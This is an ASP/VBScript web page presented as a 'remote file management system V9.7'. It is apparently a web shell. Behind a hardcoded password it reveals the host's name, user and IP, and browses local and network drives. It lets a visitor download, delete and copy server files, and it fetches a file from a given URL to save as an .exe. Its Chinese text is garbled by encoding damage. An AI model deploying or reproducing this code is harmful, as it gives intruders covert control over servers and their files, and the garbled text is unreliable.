<body bgcolor=#fff0f0><center><font color=green size=5><b>����Զ���ļ�����ϵͳ V9.7</b></font></center><hr>
<script language=vbscript>
sub seco(path)
document.cookie="pat=" & replace(path," ","+")
end sub
sub top(cop)
dim tp
tp=inputbox("����" & cop & "��:","PATH??","c:\file.exe")
if len(trim(tp))>2 then
document.cookie="pat=" & cop
document.cookie="to=" & tp
window.open("<%=url%>?id=4")
else
msgbox "����û�ɹ�!!!",4096+16,"Copy"
end if
end sub
</script>
<%
dim url
url= Request.ServerVariables("URL")
if session("login")<>"true" then
           if request.form("pwd")="85390805" then
              session("login")="true"
              response.redirect url
              else
%><center><br><body  background="res://webvw.dll/win2000.jpg">
     <form action="<%=url%>" method="POST">
    <input type=password name=pwd style="background-color: #fff0f0">
    </form>Loading...<br><img src="res://browselc.dll/loadgraphic.gif"></center>
<%
response.end 
              end if
end if
on error resume next
set fsoBrowse=CreateObject("Scripting.FileSystemObject")
Set Snet = Server.CreateObject("WSCRIPT.NETWORK")
Set oDrives = Snet.EnumNetworkDrives
folderpath =Request.cookies("pat")
if len(folderpath)<3 then  folderpath="c:\"
if (folderpath <> "")  then
set shell=server.createobject("shell.application")
set fod1=shell.namespace(folderpath)
set foditems=fod1.items

%>
<%
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
%>
<title>����:<%=Snet.ComputerName%>\<%=Snet.UserName%></title>
<%
response.write "<font color=blue size=2>NetBios Name: \\"  & Snet.ComputerName & "\" & Snet.UserName & " IP:" & Request.ServerVariables("LOCAL_ADDR")& ":"&Request.ServerVariables("SERVER_PORT") & "<br>"
response.write "Current Path: " & server.mappath(Request.ServerVariables("SCRIPT_NAME")) & "<br> Remote Now:" & now
%><center>
<form action="<%=url%>" method="POST">
�������ص�URL:<input type=text name=downurl style="background-color: #fff0f0">����Ϊ:<input type=text size=30 name=savepath value=<%=folderpath%>\file.exe  style="background-color: #fff0f0">
<input type=submit name=sb value=���� class=input style="background-color: #fff0f0">
</form></center>
<form method="post" action=<%=Request.ServerVariables("URL")%> name=gop>
���:<input type=text size=50 name=patt value=<%=folderpath%>  style="background-color: #fff0f0"><a href=<%=url%>  onclick="seco(gop.patt.value)">���</a></td></form><hr>
<%response.write "<br>����:"
For Each thing in fsoBrowse.Drives
on error resume next
if thing.driveletter="A" then
else%>
[<a href="<%=url%>" onclick="seco('<%=thing.DriveLetter%>:\')"><%=thing.DriveLetter%>��:<%=cSize(thing.FreeSpace)%>/<%=cSize(thing.TotalSize)%>-<%=thing.FileSystem%></a>]
<%end if
NEXT
response.write "����:"
For i = 0 to oDrives.Count-1%>
<a href="<%=url%>" onclick="seco('<%=oDrives.Item(i)%>\')"><%=oDrives.Item(i)%></a>
<%Next%>
<table border=1 style="FONT-SIZE: 15px"><tr><td>�ļ���(<u><font color=#f700f7><b><%=folderpath%>\</b></font></u>)</td><td>����</td><td>��С</td><td>����</td></tr>
<%for each co in foditems%>
<tr><td><a href="<%=url%><%=lono(co.type)%>" onclick="seco('<%=co.path%>')"><%=isfi(co.type)%><font color=blue>&nbsp;<%=co.name%></font></a></td>
<td><%=trim(co.type)%></td>
<td><%=csize(co.size)%></td>
<td><%=right(co.ModifyDate,len(co.ModifyDate)-2)%></td>
<td><a href="<%=url%>?id=2" onclick="seco('<%=co.path%>')">����</a></td>
<td><a href="<%=url%>?id=3" onclick="seco('<%=co.path%>')">ɾ��</a></td>
<td><a href="#" onclick="top('<%=co.path%>')">����</a></td></tr>
<%next%>
</table>
</font><hr>
<CENTER><img src="res://shdoclc.dll/warning.gif"></img><font color=red><u>����:�ԷǷ�ʹ�ô˳�����ܴ������κβ�����������Ը�!�������ڷǷ���;!!!<br>������:<i>Attrib</i>&nbsp;QQ:<i>85390805</i></u></font></center>
</body>